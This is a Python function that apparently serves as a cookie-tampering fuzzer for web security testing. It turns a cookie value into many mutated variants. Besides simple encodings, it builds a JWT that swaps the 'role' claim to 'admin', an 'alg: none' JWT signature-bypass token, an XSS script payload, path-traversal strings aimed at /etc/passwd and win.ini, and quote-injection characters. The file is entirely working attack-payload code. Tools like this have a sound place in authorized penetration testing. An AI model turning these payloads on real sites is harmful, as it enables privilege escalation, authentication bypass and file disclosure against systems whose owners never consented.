import base64
import json
import binascii
import urllib.parse
import random
import string

def mutate_cookie_value(value):
    mutations = {}

    # Original
    mutations["original"] = value

    # Empty value
    mutations["empty"] = ""

    # Base64 encode/decode
    try:
        b64e = base64.b64encode(value.encode()).decode()
        if b64e != value:
            mutations["base64"] = b64e
    except Exception:
        pass
    try:
        b64d = base64.b64decode(value.encode()).decode()
        if b64d != value:
            mutations["base64_decoded"] = b64d
    except Exception:
        pass

    # URL encode/decode
    try:
        urlenc = urllib.parse.quote(value)
        if urlenc != value:
            mutations["url_encoded"] = urlenc
    except Exception:
        pass
    try:
        urldec = urllib.parse.unquote(value)
        if urldec != value:
            mutations["url_decoded"] = urldec
    except Exception:
        pass

    # JSON-flip (deep)
    try:
        obj = json.loads(value)
        flipped = False
        for k in obj:
            if obj[k] is True:
                obj[k] = False
                flipped = True
            elif obj[k] is False:
                obj[k] = True
                flipped = True
            elif isinstance(obj[k], int):
                obj[k] = obj[k] + 1 if obj[k] < 99999 else 0
                flipped = True
            elif isinstance(obj[k], str):
                obj[k] = obj[k][::-1]
                flipped = True
        if flipped:
            j = json.dumps(obj)
            if j != value:
                mutations["json_mutated"] = j
    except Exception:
        pass

    # JWT role flip
    try:
        parts = value.split(".")
        if len(parts) == 3:
            header, payload, signature = parts
            payload += '=' * (-len(payload) % 4)
            data = json.loads(base64.urlsafe_b64decode(payload).decode())
            if "role" in data:
                data["role"] = "admin" if data["role"] != "admin" else "user"
                new_payload = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
                jwt_val = ".".join([header, new_payload, signature])
                if jwt_val != value:
                    mutations["jwt_role_flip"] = jwt_val
            # Try none-alg attack
            header_json = json.loads(base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode())
            if "alg" in header_json and header_json["alg"] != "none":
                header_json["alg"] = "none"
                new_header = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
                jwt_none = ".".join([new_header, payload, ""])
                mutations["jwt_none_alg"] = jwt_none
    except Exception:
        pass

    # Hex encode/decode
    try:
        hexed = binascii.hexlify(value.encode()).decode()
        if hexed != value:
            mutations["hex"] = hexed
    except Exception:
        pass
    try:
        dehexed = binascii.unhexlify(value.encode()).decode()
        if dehexed != value:
            mutations["hex_decoded"] = dehexed
    except Exception:
        pass

    # Reverse string
    rev = value[::-1]
    if rev != value:
        mutations["reversed"] = rev

    # Dev/debug value
    dev_values = ["false", "true", "debug", "prod", "production", "dev", "test", "stage"]
    if value.lower() in dev_values:
        for mode in dev_values:
            if value.lower() != mode:
                mutations[f"set_{mode}"] = mode

    # Number mutations
    if value.isdigit():
        mutations["zero"] = "0"
        mutations["large"] = "9999999999"
        mutations["negative"] = "-1"
        mutations["one"] = "1"

    # Boolean mutations
    if value.lower() in ["true", "false"]:
        mutations["bool_flip"] = "false" if value.lower() == "true" else "true"

    # Special strings
    special_strs = ["'", "\"", "<script>alert(1)</script>", "../../../../etc/passwd", "../../../../../windows/win.ini", "null", "undefined", "NaN"]
    for idx, s in enumerate(special_strs):
        mutations[f"special_{idx}"] = s

    # Insert random string
    rnd = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    mutations["random_str"] = rnd

    # Padding/injection
    mutations["space_prefix"] = " " + value
    mutations["space_suffix"] = value + " "
    mutations["double"] = value + value

    return mutations